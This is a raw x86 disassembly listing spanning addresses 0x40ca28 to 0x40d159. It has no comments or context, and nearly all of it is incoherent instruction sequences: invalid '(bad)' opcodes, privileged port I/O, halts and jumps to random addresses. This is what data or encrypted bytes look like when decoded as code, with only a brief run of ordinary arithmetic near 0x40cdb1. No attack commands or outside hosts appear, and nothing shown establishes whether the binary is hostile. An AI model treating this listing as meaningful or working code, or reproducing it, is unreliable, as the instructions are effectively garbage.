  40ca28:	repnz (bad) 
  40ca2b:	sar    DWORD PTR ds:0xf0cc7877,1
  40ca31:	in     al,dx
  40ca32:	outs   dx,BYTE PTR ds:[esi]
  40ca33:	cmp    ah,BYTE PTR [ecx+0x22]
  40ca36:	iret   
  40ca37:	cs inc esp
  40ca39:	pop    ss
  40ca3a:	sbb    dh,BYTE PTR [ebx-0x24]
  40ca3d:	push   es
  40ca3e:	shr    al,cl
  40ca40:	cdq    
  40ca41:	pop    ds
  40ca42:	jp     0x40cab1
  40ca44:	sbb    eax,0x9d241afc
  40ca49:	mov    edx,0xc664c3ba
  40ca4e:	mov    esi,0x74dec583
  40ca53:	not    BYTE PTR [eax-0x26bb472a]
  40ca59:	rol    BYTE PTR [ebx-0x3cfa3e82],1
  40ca5f:	pop    ebp
  40ca60:	inc    esp
  40ca61:	pop    eax
  40ca62:	rcl    BYTE PTR [edi-0x20],1
  40ca65:	nop
  40ca66:	pusha  
  40ca67:	xchg   edi,eax
  40ca68:	idiv   esi
  40ca6a:	test   ah,0xdd
  40ca6d:	scas   eax,DWORD PTR es:[edi]
  40ca6e:	adc    al,0xc9
  40ca70:	xchg   ebx,eax
  40ca71:	mov    eax,ds:0x31ea29e1
  40ca76:	adc    eax,0x3a927158
  40ca7b:	push   esp
  40ca7c:	xchg   esi,eax
  40ca7d:	push   edi
  40ca7e:	aad    0x18
  40ca80:	push   esp
  40ca81:	mov    al,0x73
  40ca83:	jne    0x40ca3a
  40ca85:	fcomp  QWORD PTR [ebx]
  40ca87:	and    eax,0xaca4bce9
  40ca8c:	arpl   sp,dx
  40ca8e:	mov    bl,0x23
  40ca90:	and    DWORD PTR [esi+0x747dd0d2],0xffffffa0
  40ca97:	ror    BYTE PTR [edx+esi*2+0x78],0x83
  40ca9c:	dec    edx
  40ca9d:	pop    esi
  40ca9e:	mov    edx,0x20cead2c
  40caa3:	aad    0x60
  40caa5:	and    BYTE PTR [eax+0x103b2d47],0x1c
  40caac:	mov    edx,0x24e1aa25
  40cab1:	not    DWORD PTR [ebp+0xf7b48ea]
  40cab7:	or     dh,dl
  40cab9:	hlt    
  40caba:	stos   BYTE PTR es:[edi],al
  40cabb:	pop    esp
  40cabc:	in     al,0x2c
  40cabe:	jl     0x40ca77
  40cac0:	xchg   ebp,eax
  40cac1:	or     al,0x21
  40cac3:	sar    BYTE PTR [ebp+0xe],1
  40cac6:	mov    esi,0xdb3a55c5
  40cacb:	add    al,0x36
  40cacd:	pop    ds
  40cace:	pop    edi
  40cacf:	in     eax,0x8f
  40cad1:	mov    esp,DWORD PTR [esi]
  40cad3:	dec    edx
  40cad4:	and    ebp,edx
  40cad6:	lods   al,BYTE PTR ds:[esi]
  40cad7:	ret    
  40cad8:	add    BYTE PTR [eax-0x4],bl
  40cadb:	ror    bh,cl
  40cadd:	push   cs
  40cade:	ins    DWORD PTR es:[edi],dx
  40cadf:	jge    0x40ca66
  40cae1:	and    DWORD PTR [esp+edi*4+0x69],ebp
  40cae5:	test   DWORD PTR [ecx-0x6e],esp
  40cae8:	fldcw  WORD PTR [edx+0x590e0ac2]
  40caee:	cdq    
  40caef:	mov    ecx,0xad8a1b66
  40caf4:	push   es
  40caf5:	pusha  
  40caf6:	lds    edi,FWORD PTR [esi-0x46]
  40caf9:	add    BYTE PTR [edi-0x54ba945d],dl
  40caff:	int3   
  40cb00:	cmp    bh,BYTE PTR [ebp-0x4aa7bd6e]
  40cb06:	pop    ebx
  40cb07:	xchg   esp,eax
  40cb08:	pop    eax
  40cb09:	add    BYTE PTR [ebx+ebp*2-0x5755993f],ch
  40cb10:	mov    ecx,0xd9d87c45
  40cb15:	push   ebx
  40cb16:	scas   al,BYTE PTR es:[edi]
  40cb17:	enter  0x115d,0x52
  40cb1b:	mov    al,ds:0xad549bbc
  40cb20:	retf   
  40cb21:	ficomp WORD PTR [esi*1+0x7428429d]
  40cb28:	xor    ch,0x33
  40cb2b:	xor    al,0xf9
  40cb2d:	sub    BYTE PTR [ecx-0x1a],ch
  40cb30:	inc    edx
  40cb31:	push   esp
  40cb32:	jbe    0x40caeb
  40cb34:	dec    ebp
  40cb35:	cs xchg edi,eax
  40cb37:	dec    edx
  40cb38:	pop    ecx
  40cb39:	and    eax,0xf557d63d
  40cb3e:	arpl   WORD PTR [ebp-0x4423ab2],ax
  40cb44:	repnz lods al,BYTE PTR ds:[esi]
  40cb46:	xchg   esp,eax
  40cb47:	mov    eax,0x1fa56dd6
  40cb4c:	sbb    al,0x1
  40cb4e:	js     0x40cb15
  40cb50:	cs aam 0x6d
  40cb53:	mov    edi,eax
  40cb55:	dec    esp
  40cb56:	shl    DWORD PTR [ebx+0x50ac53c6],1
  40cb5c:	lds    ecx,FWORD PTR [edx+edi*1]
  40cb5f:	out    0x82,eax
  40cb61:	jo     0x40caf7
  40cb63:	jecxz  0x40cb5b
  40cb65:	je     0x40cb7a
  40cb67:	mov    edx,0x65bbd1f4
  40cb6c:	idiv   ch
  40cb6e:	ret    
  40cb6f:	inc    ebx
  40cb70:	lds    esp,FWORD PTR [edi+0x6e]
  40cb73:	lds    esp,FWORD PTR [edi]
  40cb75:	push   edx
  40cb76:	(bad)  
  40cb77:	or     eax,0x240b062f
  40cb7c:	pusha  
  40cb7d:	sub    BYTE PTR [edx-0x29],bl
  40cb80:	cmp    eax,0xc61e02a3
  40cb85:	fs dec ebx
  40cb87:	in     al,0x54
  40cb89:	xlat   BYTE PTR ds:[ebx]
  40cb8a:	dec    esp
  40cb8b:	fidiv  WORD PTR [edi-0x4c16e13d]
  40cb91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb92:	push   esp
  40cb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb94:	out    0x92,eax
  40cb96:	mov    bh,0x76
  40cb98:	sbb    DWORD PTR [ecx],ecx
  40cb9a:	(bad)  
  40cb9b:	std    
  40cb9c:	mov    ds:0x36dacd60,eax
  40cba1:	ret    0xe5d8
  40cba4:	pusha  
  40cba5:	rcr    ebx,1
  40cba7:	sahf   
  40cba8:	sti    
  40cba9:	addr16 fs out dx,al
  40cbac:	out    dx,al
  40cbad:	adc    DWORD PTR [ebx],eax
  40cbaf:	mov    edx,0xaeb4a344
  40cbb4:	sub    bh,BYTE PTR [edi+0x7ac917b]
  40cbba:	adc    DWORD PTR [edi+0x15907908],edi
  40cbc0:	mov    bl,0x1e
  40cbc2:	sbb    esp,edi
  40cbc4:	push   0x4214fe08
  40cbc9:	mov    esi,0xdc48672f
  40cbce:	data16 cmc 
  40cbd0:	jne    0x40cbfb
  40cbd2:	cs pusha 
  40cbd4:	push   ds
  40cbd5:	stos   DWORD PTR es:[edi],eax
  40cbd6:	inc    esp
  40cbd7:	into   
  40cbd8:	jge    0x40cb92
  40cbda:	ja     0x40cb80
  40cbdc:	jl     0x40cbd6
  40cbde:	jle    0x40cbe0
  40cbe0:	mov    bh,0x6
  40cbe2:	and    esi,edx
  40cbe4:	inc    ebp
  40cbe5:	dec    esp
  40cbe6:	dec    ecx
  40cbe7:	pop    ebp
  40cbe8:	mov    esi,esp
  40cbea:	sub    esi,esi
  40cbec:	mov    eax,0xba0bc2fe
  40cbf1:	icebp  
  40cbf2:	mov    al,0x69
  40cbf4:	lock push eax
  40cbf6:	pop    es
  40cbf7:	xchg   DWORD PTR [esi],edx
  40cbf9:	fnstenv [ebp+0x18]
  40cbfc:	call   0xc1a458d7
  40cc01:	fwait
  40cc02:	cmp    al,0xb5
  40cc04:	imul   DWORD PTR [edi-0x428643ed]
  40cc0a:	lock ds (bad) 
  40cc0d:	cs iret 
  40cc0f:	sbb    cl,BYTE PTR [ebx]
  40cc11:	adc    DWORD PTR [edx+ebp*8-0x16b2cd8a],eax
  40cc18:	sbb    bl,bl
  40cc1a:	dec    ebx
  40cc1b:	mov    al,0xfa
  40cc1d:	sahf   
  40cc1e:	xor    al,0xa8
  40cc20:	aad    0x5e
  40cc22:	pop    ebp
  40cc23:	das    
  40cc24:	push   0x59
  40cc26:	sbb    ecx,DWORD PTR [ecx-0x24]
  40cc29:	mov    ds,WORD PTR [edi+ecx*1]
  40cc2c:	sub    bh,al
  40cc2e:	aad    0x42
  40cc30:	jae    0x40cbd4
  40cc32:	add    esp,DWORD PTR [eax]
  40cc34:	mov    dh,0xb7
  40cc36:	repnz and DWORD PTR [edx+0x50],edi
  40cc3a:	cmp    BYTE PTR [ebp+eiz*1+0x29],cl
  40cc3e:	pop    edi
  40cc3f:	bound  esp,QWORD PTR [ebx]
  40cc41:	inc    esp
  40cc42:	cdq    
  40cc43:	jb     0x40cbd5
  40cc45:	mov    ch,0xff
  40cc47:	dec    ebx
  40cc48:	jecxz  0x40cc2a
  40cc4a:	adc    eax,0xb3bcf561
  40cc4f:	popa   
  40cc50:	xchg   ecx,eax
  40cc51:	pop    eax
  40cc52:	mov    al,ds:0x827c1d4e
  40cc57:	into   
  40cc58:	adc    cl,al
  40cc5a:	test   BYTE PTR [esi],bl
  40cc5c:	sub    BYTE PTR [eax-0x7],0x14
  40cc60:	jecxz  0x40cc56
  40cc62:	nop
  40cc63:	xchg   ecx,eax
  40cc64:	mov    ds:0xb2fe628d,eax
  40cc69:	jmp    0x5b85b269
  40cc6e:	sbb    dl,BYTE PTR [ecx-0x6dcf5e50]
  40cc74:	jecxz  0x40cbf7
  40cc76:	ffreep st(4)
  40cc78:	jnp    0x40cc28
  40cc7a:	ret    
  40cc7b:	jmp    0x40cc97
  40cc7d:	sbb    esp,DWORD PTR [esi-0x63a627c]
  40cc83:	dec    esp
  40cc84:	mov    al,0xf2
  40cc86:	mov    dh,0x65
  40cc88:	sbb    eax,0xab9c64c7
  40cc8d:	aas    
  40cc8e:	sbb    esp,DWORD PTR [ebx]
  40cc90:	(bad)  
  40cc91:	out    0x14,eax
  40cc93:	or     al,0x3f
  40cc95:	sbb    eax,0x9ac42c1d
  40cc9a:	(bad)  
  40cc9c:	dec    esp
  40cc9d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9f:	push   esi
  40cca0:	rol    WORD PTR [edi-0x108cb152],0xd7
  40cca8:	mov    bh,0x50
  40ccaa:	sbb    BYTE PTR [edx+0x7e6b18a9],ch
  40ccb0:	nop
  40ccb1:	cmp    BYTE PTR [edx-0x6dc246ce],cl
  40ccb7:	push   eax
  40ccb8:	ins    BYTE PTR es:[edi],dx
  40ccb9:	jo     0x40cc59
  40ccbb:	cmp    al,BYTE PTR [ebx]
  40ccbd:	jle    0x40cccd
  40ccbf:	pop    eax
  40ccc0:	inc    ebx
  40ccc1:	mov    ah,0xe2
  40ccc3:	lods   eax,DWORD PTR ds:[esi]
  40ccc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc5:	xor    bh,BYTE PTR [ebp-0x53]
  40ccc8:	stc    
  40ccc9:	cmp    BYTE PTR [edx-0x6b3406b0],bh
  40cccf:	sbb    edi,DWORD PTR [ebp-0x45]
  40ccd2:	rol    BYTE PTR [ecx+0x5704ab17],1
  40ccd8:	dec    ebx
  40ccd9:	fsub   QWORD PTR [eax+0x75]
  40ccdc:	arpl   WORD PTR ds:0x5fc5ed31,sp
  40cce2:	test   eax,0xe42b2fe5
  40cce7:	xor    DWORD PTR [eax-0xee3a5cd],0x5
  40ccee:	jmp    0x40cd59
  40ccf0:	dec    eax
  40ccf1:	test   eax,0x5ae923eb
  40ccf6:	int    0xc4
  40ccf8:	mov    ds,WORD PTR [edi-0x78480882]
  40ccfe:	inc    edi
  40ccff:	mov    edx,0x8ce321e8
  40cd04:	dec    ebp
  40cd05:	or     DWORD PTR [ebx],esi
  40cd07:	xor    al,0xf8
  40cd09:	pop    ss
  40cd0a:	scas   al,BYTE PTR es:[edi]
  40cd0b:	sub    al,0xec
  40cd0d:	and    DWORD PTR [ecx-0x23],ebx
  40cd10:	enter  0x5a45,0x37
  40cd14:	fiadd  WORD PTR [edi]
  40cd16:	or     DWORD PTR [ebx+0x52],edx
  40cd19:	retf   0xa9be
  40cd1c:	je     0x40cd41
  40cd1e:	test   BYTE PTR [esi],ah
  40cd20:	and    eax,0xf086936b
  40cd25:	cdq    
  40cd26:	shl    DWORD PTR [ebx-0x4],1
  40cd29:	push   cs
  40cd2a:	sub    ch,ah
  40cd2c:	sub    eax,0xcbe9013e
  40cd31:	add    bh,BYTE PTR [ecx+0x5fed7490]
  40cd37:	test   eax,0x64d1575a
  40cd3c:	pop    ecx
  40cd3d:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  40cd40:	mov    ds:0x3d10766e,ax
  40cd46:	jge    0x40cd2e
  40cd48:	add    ecx,edi
  40cd4a:	jb     0x40cd84
  40cd4c:	or     eax,0x3762864f
  40cd51:	cwde   
  40cd52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd53:	inc    ecx
  40cd54:	sub    al,0x2d
  40cd56:	stc    
  40cd57:	lods   eax,DWORD PTR gs:[esi]
  40cd59:	sbb    edx,eax
  40cd5b:	xor    ecx,DWORD PTR [esp+edx*4-0x44]
  40cd5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd60:	jne    0x40cce2
  40cd62:	xor    DWORD PTR [eax+0x77c4fd74],ebp
  40cd68:	fadd   QWORD PTR [ebp+0x4b]
  40cd6b:	ss jge 0x40cd51
  40cd6e:	and    al,BYTE PTR [ebx+0x4f3d6f3f]
  40cd74:	inc    esp
  40cd75:	loopne 0x40cdc3
  40cd77:	enter  0x5ae2,0xcd
  40cd7b:	adc    ebx,eax
  40cd7d:	adc    DWORD PTR [eax],ebx
  40cd7f:	je     0x40cd4a
  40cd81:	icebp  
  40cd82:	fsubr  st,st(3)
  40cd84:	pop    ss
  40cd85:	stos   BYTE PTR es:[edi],al
  40cd86:	xchg   DWORD PTR [ebx-0x3b9fffa1],edi
  40cd8c:	(bad)  
  40cd8d:	push   eax
  40cd8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd8f:	in     eax,0x41
  40cd91:	xchg   ebx,eax
  40cd92:	ja     0x40cd27
  40cd94:	pop    ebp
  40cd95:	ficom  DWORD PTR [ecx+0x93d7fb5]
  40cd9b:	lea    ecx,[edi+0x32757891]
  40cda1:	rcl    BYTE PTR [eax],cl
  40cda3:	add    eax,0x991f9488
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	loope  0x40cd8c
  40cddb:	and    al,0x43
  40cddd:	int3   
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	out    dx,eax
  40cde6:	adc    dh,al
  40cde8:	iret   
  40cde9:	dec    ebp
  40cdea:	popf   
  40cdeb:	scas   al,BYTE PTR es:[edi]
  40cdec:	cmp    al,0x79
  40cdee:	loopne 0x40cdd6
  40cdf0:	push   ss
  40cdf1:	or     bl,bl
  40cdf3:	cmp    al,0x75
  40cdf5:	sbb    DWORD PTR [edi],ecx
  40cdf7:	mov    DWORD PTR [ebx+0x3a],edi
  40cdfa:	mov    ecx,0x8606c870
  40cdff:	jmp    DWORD PTR [ebp-0x4b]
  40ce02:	jge    0x40ce13
  40ce04:	repnz fadd QWORD PTR [edi]
  40ce07:	or     eax,0x8aabb12f
  40ce0c:	inc    edx
  40ce0d:	call   0xe7c5c135
  40ce12:	icebp  
  40ce13:	xor    eax,0xa4fb252
  40ce18:	fld    DWORD PTR [ebx+eiz*1-0x2a]
  40ce1c:	xchg   esp,eax
  40ce1d:	jmp    0x186ecb6e
  40ce22:	inc    edi
  40ce23:	test   BYTE PTR [ebp+0x5160fcbb],0x4f
  40ce2a:	lea    ebp,[ecx]
  40ce2c:	inc    ebp
  40ce2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2e:	push   ebx
  40ce2f:	jle    0x40ce96
  40ce31:	pop    es
  40ce32:	mov    eax,0xd59208c0
  40ce37:	sar    BYTE PTR ds:0xb4b62e45,1
  40ce3d:	sub    al,0xe1
  40ce3f:	xor    ecx,DWORD PTR [esp+edx*1]
  40ce42:	inc    edi
  40ce43:	mov    esi,0x5f23108b
  40ce48:	dec    ebx
  40ce49:	xor    bl,BYTE PTR [ebx]
  40ce4b:	out    0xe3,al
  40ce4d:	out    dx,eax
  40ce4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce4f:	cmp    ebx,DWORD PTR [ecx-0x232a50f0]
  40ce55:	and    al,0xda
  40ce57:	test   DWORD PTR [edi],0x2658df3b
  40ce5d:	jnp    0x40ced1
  40ce5f:	imul   esp,DWORD PTR [edi-0x8],0x5eb06c1a
  40ce66:	xor    ebx,esp
  40ce68:	call   0x3aa0b7f0
  40ce6d:	add    esp,DWORD PTR [esp+edi*8-0x7c]
  40ce71:	mov    ebp,0xd891927e
  40ce76:	cld    
  40ce77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce78:	sar    edi,0x15
  40ce7b:	xchg   dh,dh
  40ce7d:	in     eax,0xb1
  40ce7f:	(bad)  
  40ce81:	neg    BYTE PTR [edi]
  40ce83:	mov    al,ds:0x5d1fb754
  40ce88:	push   cs
  40ce89:	sbb    eax,0xad173b0c
  40ce8e:	popa   
  40ce8f:	dec    ebp
  40ce90:	mov    ecx,DWORD PTR [edx-0x5a]
  40ce93:	stos   BYTE PTR es:[edi],al
  40ce94:	xor    DWORD PTR [eax+0x69],edi
  40ce97:	(bad)  
  40ce98:	xchg   ecx,eax
  40ce99:	mov    ah,0xc2
  40ce9b:	inc    ebx
  40ce9c:	adc    eax,0x244c8af4
  40cea1:	out    0xc,al
  40cea3:	dec    ebx
  40cea4:	das    
  40cea5:	push   eax
  40cea6:	fsubp  st(2),st
  40cea8:	sbb    BYTE PTR [edi-0x58],ch
  40ceab:	mov    ch,0x82
  40cead:	fadd   QWORD PTR [esi+0x15]
  40ceb0:	dec    esi
  40ceb1:	scas   al,BYTE PTR es:[edi]
  40ceb2:	xor    ebx,DWORD PTR ds:0xa6838c64
  40ceb8:	test   al,0xca
  40ceba:	pop    ecx
  40cebb:	jg     0x40ce82
  40cebd:	or     al,0x3a
  40cebf:	test   eax,0x223b8969
  40cec4:	xchg   esp,eax
  40cec5:	fild   DWORD PTR [esi]
  40cec7:	imul   eax,DWORD PTR [eax-0x21000c89],0xb034fa5f
  40ced1:	clc    
  40ced2:	pop    esp
  40ced3:	loopne 0x40ce69
  40ced5:	cld    
  40ced6:	jae    0x40ce6d
  40ced8:	test   esi,ebx
  40ceda:	test   BYTE PTR [esi+ebp*1],dh
  40cedd:	mov    bh,0x6a
  40cedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cee0:	clc    
  40cee1:	dec    eax
  40cee2:	push   ebp
  40cee3:	retf   
  40cee4:	dec    esi
  40cee5:	or     BYTE PTR [esi+eax*1-0x73],0x71
  40ceea:	push   ebp
  40ceeb:	jp     0x40ce75
  40ceed:	push   edi
  40ceee:	sbb    DWORD PTR [edx-0x63],edx
  40cef1:	stos   BYTE PTR es:[edi],al
  40cef2:	pop    ds
  40cef3:	or     dh,BYTE PTR [ebx+ebx*1]
  40cef6:	mov    DWORD PTR [esi-0x4f],edx
  40cef9:	jg     0x40cf60
  40cefb:	leave  
  40cefc:	popf   
  40cefd:	jbe    0x40cf45
  40ceff:	ret    0x413f
  40cf02:	ja     0x40cea0
  40cf04:	adc    BYTE PTR [edx+0xc],al
  40cf07:	push   ebp
  40cf08:	add    BYTE PTR [ecx+eiz*4+0x2d],dl
  40cf0c:	ret    
  40cf0d:	loop   0x40cf54
  40cf0f:	inc    ecx
  40cf10:	adc    ecx,ecx
  40cf12:	fs es ins BYTE PTR es:[edi],dx
  40cf15:	mov    esp,0x4227f021
  40cf1a:	cmc    
  40cf1b:	push   ecx
  40cf1c:	pop    es
  40cf1d:	push   ds
  40cf1e:	mov    edi,0xb07f1663
  40cf23:	(bad)  
  40cf24:	mov    esp,0xc5aad03c
  40cf29:	jns    0x40cf65
  40cf2b:	xor    eax,0x17f5dd18
  40cf30:	dec    edx
  40cf31:	outs   dx,BYTE PTR ds:[esi]
  40cf32:	lea    esi,[esi-0x60]
  40cf35:	out    0xe3,al
  40cf37:	and    ebx,esi
  40cf39:	inc    ebx
  40cf3a:	out    0xbd,eax
  40cf3c:	int3   
  40cf3d:	mov    dl,0xb2
  40cf3f:	and    ebx,DWORD PTR [ecx+ebx*4]
  40cf42:	popa   
  40cf43:	std    
  40cf44:	sbb    al,BYTE PTR [edi-0x78447926]
  40cf4a:	clc    
  40cf4b:	pusha  
  40cf4c:	out    dx,al
  40cf4d:	pusha  
  40cf4e:	inc    esp
  40cf4f:	dec    edi
  40cf50:	cmp    BYTE PTR [edx+0x2a],cl
  40cf53:	jb     0x40cfa9
  40cf55:	sbb    ax,0x4684
  40cf59:	imul   BYTE PTR [esi-0x5f343e46]
  40cf5f:	out    0x38,al
  40cf61:	jecxz  0x40cf7d
  40cf63:	xor    cl,bl
  40cf65:	mov    ds:0xc4c3cfd8,eax
  40cf6a:	aam    0xf1
  40cf6c:	jp     0x40cf86
  40cf6e:	test   ebp,edx
  40cf70:	(bad)  
  40cf71:	cmp    al,0x20
  40cf73:	add    DWORD PTR [edi+eax*8],edi
  40cf76:	inc    edx
  40cf77:	xchg   ebx,eax
  40cf78:	ror    DWORD PTR [ebx-0x6d],cl
  40cf7b:	mov    al,0xe0
  40cf7d:	and    DWORD PTR [edi+0x5ba33dc7],eax
  40cf83:	cld    
  40cf84:	and    BYTE PTR [edx-0x4b],ch
  40cf87:	imul   edx,DWORD PTR [edx+0x75],0x3c
  40cf8b:	mov    ah,0xc9
  40cf8d:	lea    eax,[ecx-0x6cfa3b02]
  40cf93:	cmp    ch,BYTE PTR [eax+0x5d]
  40cf96:	jge    0x40cfa7
  40cf98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf99:	adc    al,0xdf
  40cf9b:	stos   BYTE PTR es:[edi],al
  40cf9c:	push   0x2a495bb8
  40cfa1:	dec    esp
  40cfa2:	les    ebp,FWORD PTR [eax+0x79e6d23e]
  40cfa8:	aad    0x13
  40cfaa:	nop
  40cfab:	loope  0x40cf8b
  40cfad:	jecxz  0x40cf41
  40cfaf:	stc    
  40cfb0:	call   0xcf71ec0a
  40cfb5:	jl     0x40cf44
  40cfb7:	jge    0x40cf66
  40cfb9:	and    BYTE PTR ds:[edi],cl
  40cfbc:	jmp    0x40cfdd
  40cfbe:	inc    ebp
  40cfbf:	dec    eax
  40cfc0:	test   al,0x2d
  40cfc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfc3:	ins    DWORD PTR es:[edi],dx
  40cfc4:	xchg   ebp,eax
  40cfc5:	lds    ebp,FWORD PTR [ecx+0x1d]
  40cfc8:	and    BYTE PTR cs:[eax-0x39],al
  40cfcc:	adc    ax,0x35a
  40cfd0:	mov    esp,0x2a489c24
  40cfd5:	fldenv es:[ebp-0x11ec7501]
  40cfdc:	es aam 0xfc
  40cfdf:	xor    ebx,edi
  40cfe1:	push   ebx
  40cfe2:	sub    DWORD PTR [esi*2-0x4ea6bff5],esi
  40cfe9:	ret    
  40cfea:	adc    BYTE PTR [esi-0x61ec95bd],bl
  40cff0:	fs inc esp
  40cff2:	pushf  
  40cff3:	cld    
  40cff4:	in     eax,dx
  40cff5:	lahf   
  40cff6:	(bad)  
  40cff7:	pusha  
  40cff8:	retf   0x3327
  40cffb:	inc    esp
  40cffc:	dec    esp
  40cffd:	mov    dh,0x97
  40cfff:	int    0x39
  40d001:	pop    edi
  40d002:	jb     0x40cfa9
  40d004:	push   ecx
  40d005:	jno    0x40cff1
  40d007:	inc    esi
  40d008:	repnz mov bh,0x7
  40d00b:	sub    eax,0x257b7ec8
  40d010:	sub    al,bl
  40d012:	inc    edx
  40d013:	(bad)  
  40d014:	shr    ch,cl
  40d016:	ss mov bh,0xa3
  40d01a:	mov    edi,0x4347342e
  40d01f:	arpl   WORD PTR [eax+0x20],si
  40d022:	sub    ch,BYTE PTR [ebp-0x17ea9ac]
  40d028:	retf   0x7292
  40d02b:	add    al,0xe2
  40d02d:	add    BYTE PTR [edx-0x19],bl
  40d030:	xchg   DWORD PTR [ebx+ebp*2+0x9],esi
  40d034:	jne    0x40d07e
  40d036:	imul   ebp,DWORD PTR [edi-0x6],0xffffffbb
  40d03a:	out    0xa,eax
  40d03c:	mov    al,0x9a
  40d03e:	push   eax
  40d03f:	stc    
  40d040:	imul   esp,ebx,0x79caaebf
  40d046:	jmp    0x40d08e
  40d048:	and    DWORD PTR [ebx+edx*4+0x2c359c27],0x17
  40d050:	adc    cl,ch
  40d052:	out    0xbc,al
  40d054:	xchg   edi,eax
  40d055:	int3   
  40d056:	xchg   BYTE PTR [edx-0xea6f2ed],bh
  40d05c:	cld    
  40d05d:	les    esi,FWORD PTR [ebx-0x57]
  40d060:	leave  
  40d061:	and    ah,BYTE PTR [ebp+0x5429402f]
  40d067:	inc    ebp
  40d068:	pop    ds
  40d069:	xor    ch,BYTE PTR [edx-0x18e2d4c0]
  40d06f:	xor    cl,dl
  40d071:	popa   
  40d072:	mov    ds,WORD PTR [edi-0x4]
  40d075:	mov    bl,0xe8
  40d077:	(bad)  
  40d078:	mov    dh,0xb4
  40d07a:	fucomip st,st(6)
  40d07c:	stc    
  40d07d:	imul   ebx,DWORD PTR [eax-0x15],0x20
  40d081:	aam    0xcd
  40d083:	sbb    al,BYTE PTR [edx+0x3c5b20a]
  40d089:	push   ebp
  40d08a:	xchg   edi,eax
  40d08b:	push   es
  40d08c:	pop    ds
  40d08d:	lahf   
  40d08e:	pop    ss
  40d08f:	(bad)  
  40d091:	in     al,0xd4
  40d093:	int3   
  40d094:	adc    esi,edi
  40d096:	mov    ch,0xbc
  40d098:	xchg   esp,eax
  40d099:	into   
  40d09a:	jnp    0x40d04e
  40d09c:	push   cs
  40d09d:	mov    BYTE PTR [ebx+0x446ff699],ch
  40d0a3:	xchg   edx,esi
  40d0a5:	xchg   BYTE PTR [esi+edx*1-0x41],ch
  40d0a9:	xchg   esi,eax
  40d0aa:	or     eax,0x6c059c32
  40d0af:	xchg   esi,eax
  40d0b0:	stos   BYTE PTR es:[edi],al
  40d0b1:	or     al,0xe7
  40d0b3:	xchg   BYTE PTR ds:0x3cb94e85,bl
  40d0b9:	lods   eax,DWORD PTR ss:[esi]
  40d0bb:	popf   
  40d0bc:	mov    ecx,0xe247743
  40d0c1:	ins    DWORD PTR es:[edi],dx
  40d0c2:	shl    DWORD PTR [eax-0x76],cl
  40d0c5:	js     0x40d0a5
  40d0c7:	pop    ss
  40d0c8:	lods   eax,DWORD PTR ds:[esi]
  40d0c9:	sbb    eax,0x68a6a5d3
  40d0ce:	in     al,dx
  40d0cf:	mov    dl,BYTE PTR [eax]
  40d0d1:	mov    al,0x87
  40d0d3:	(bad)  
  40d0d4:	les    esp,FWORD PTR [ebx+eax*1-0x289b63ec]
  40d0db:	test   bh,ah
  40d0dd:	mov    ebx,0x988058c5
  40d0e2:	fdivr  DWORD PTR fs:[eax]
  40d0e5:	jnp    0x40d076
  40d0e7:	or     al,0x60
  40d0e9:	jl     0x40d12f
  40d0eb:	xor    eax,0x36f57283
  40d0f0:	inc    ebx
  40d0f1:	mov    ebx,cs
  40d0f3:	lods   al,BYTE PTR ds:[esi]
  40d0f4:	jl     0x40d0eb
  40d0f6:	pop    eax
  40d0f7:	and    eax,0xda419686
  40d0fc:	mov    esi,0xbfabca8d
  40d101:	mov    cl,0x64
  40d103:	les    edx,FWORD PTR [esi]
  40d105:	inc    ebp
  40d106:	lahf   
  40d107:	xor    ecx,DWORD PTR [ebx+eax*2+0x5b]
  40d10b:	inc    esp
  40d10c:	shr    DWORD PTR [edi-0x4c0f91f5],0xea
  40d113:	adc    ecx,DWORD PTR [eax+0x6f7142b4]
  40d119:	popf   
  40d11a:	xchg   ebp,eax
  40d11b:	mov    esp,0x8a210a50
  40d120:	xor    ebp,DWORD PTR [edi]
  40d122:	cwde   
  40d123:	rol    BYTE PTR [edi+0x127834bf],0xc6
  40d12a:	cmp    ch,0x67
  40d12d:	jae    0x40d12a
  40d12f:	jge    0x40d110
  40d131:	leave  
  40d132:	outs   dx,BYTE PTR ds:[esi]
  40d133:	into   
  40d134:	xor    BYTE PTR [ebx],0xb4
  40d137:	or     DWORD PTR [edx],0x316a609d
  40d13d:	jmp    0x62b3:0x851b2648
  40d144:	test   BYTE PTR [ecx],dh
  40d146:	sbb    BYTE PTR [ebp+0x78],dl
  40d149:	cdq    
  40d14a:	into   
  40d14b:	(bad)
  40d14e:	push   ss
  40d14f:	data16 mov dh,0xc5
  40d152:	xlat   BYTE PTR ds:[ebx]
  40d153:	outs   dx,DWORD PTR ds:[esi]
  40d154:	shr    eax,1
  40d156:	fcom   QWORD PTR [esi-0x59]
  40d159:	mov    ecx,0x8faac05d
